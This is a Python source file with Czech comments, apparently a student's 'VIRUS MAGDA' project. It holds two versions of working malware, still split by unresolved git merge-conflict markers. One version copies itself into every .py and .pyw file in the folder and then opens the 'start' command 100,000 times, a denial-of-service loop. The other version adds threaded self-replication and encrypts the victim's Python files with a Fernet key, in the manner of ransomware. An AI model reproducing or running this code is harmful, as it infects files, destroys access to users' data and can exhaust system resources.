#VIRUS MAGDA
import sys
import glob
<<<<<<< HEAD

import os

Virus = []

script = open(sys.argv[0], "r")
lines = script.readlines()
script.close()

###Zde definujeme oblast viru -> začíná nadpisem VIRUS MAGDA končí SBOHEM###
Nakazeny = False
for line in lines:
    if line == "#VIRUS MAGDA":
        Nakazeny = True
    if not Nakazeny:
        Virus.append(line)
    if line == "# SBOHEM \n":
        break

###Zde hledám python soubory, které otevřeme, přečteme, zjistíme, zda je už soubor infikovaný (podle nadpisu VIRUS MAGDA)
###Pokud soubor není nakažený, tak do něj vložíme náš škodlivý kód
pythonSoubory = glob.glob('*.py') + glob.glob('*.pyw')
for file in pythonSoubory:
    script = open(file, "r")
    Kod = script.readlines()
    script.close()

    Nakazeny = False

    for line in Kod:
        if line == "#VIRUS MAGDA\n":
            Nakazeny = True
            break
            

    if not Nakazeny:
        NemocnyKod = []
        NemocnyKod.extend(Virus)
        NemocnyKod.extend('\n')
        NemocnyKod.extend(Kod)

        script = open(file, 'w')
        script.writelines(NemocnyKod)
        script.close()
###Zde je náš škodlivý kód
def ZlyKod():
    for a in range(100000):
        os.system('start')

ZlyKod()
#SBOHEM

=======
from cryptography.fernet import Fernet   
"""Implementace symetrické kryptografie"""
import os
import threading    
"""Zajistí, aby mohlo na PC jet více procesů najednou tzn. vytvoření vlákna"""

def Replicate ():  
    """Tato funkce zajistí replikaci viru"""

    Virus = []  
    """Vytvoření prostoru pro uložení kódu viru"""

    script = open(sys.argv[0], "r")  
    """Přečtení a uložení probíhajícího skriptu viru"""
    lines = script.readlines()
    script.close()        
    """Zavření skriptu"""

    
    Nakazeny = False  
    """Zde definujeme oblast viru -> začíná nadpisem VIRUS MAGDA končí SBOHEM"""
    for line in lines:
        if line == "#VIRUS MAGDA":
            Nakazeny = True     
        if not Nakazeny:
            Virus.append(line)
        if line == "# SBOHEM \n":
            break

    

    pythonSoubory = glob.glob('*.py') + glob.glob('*.pyw')       
    """Zde hledám python soubory, které otevřeme, přečteme, zjistíme, zda je už soubor infikovaný (podle nadpisu VIRUS MAGDA)"""
    for file in pythonSoubory:      
    
        script = open(file, "r")
        Kod = script.readlines()
        script.close()

        Nakazeny = False

        for line in Kod:             
        
            if line == "#VIRUS MAGDA\n" or file in ["encrypting.py","virus2.py"]:
                Nakazeny = True
                break
            

        if not Nakazeny:     

            NemocnyKod = []
            NemocnyKod.extend(Virus)
            NemocnyKod.extend('\n')
            NemocnyKod.extend(Kod)

            script = open(file, 'w')
            script.writelines(NemocnyKod)
            script.close()


"""Zde jsou funkce samotného škodlivého kódu, jedná se o zašifrování souborů oběti (symetrické šifrování pomocí Fernet)"""


"""Vytvoření symetrického klíče, jež se nám vygeneruje do key souboru key.key"""

def write_key():    
   
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

"""Proces  zašifrování"""
def encrypt(filename, key):  
   
    f = Fernet(key)
    with open(filename, "rb") as file:
    # precteme vsechna data
        file_data = file.read()
    #zasifrujeme data
        encrypted_data = f.encrypt(file_data)
    #vytvorríme novy zasifrovany soubor
    with open(filename, "wb") as file:
        file.write(encrypted_data)

"""Pro dešifrování potřebujeme stejný kód, kterým jsme soubory zašifrovali, tato funkce nám načte onen vygenerovaný klíč"""
def load_key():    
    
    return open("key.key", "rb").read()

def DoMaliciousThings(key):
    for file in glob.glob('*.py') + glob.glob('*.pyw'):
        if file not in ["encrypting.py","virus2.py"]:
            encrypt(file,key)
            pass


write_key()
key = load_key()
y = threading.Thread(target=Replicate)			
y.start()							
#x = threading.Thread(target=DoMaliciousThings, args=(key,), daemon=True)
#x.start()
DoMaliciousThings(key)

#SBOHEM
>>>>>>> 580955f5df2223cb1f7e8204e5b77bfd6b71739a
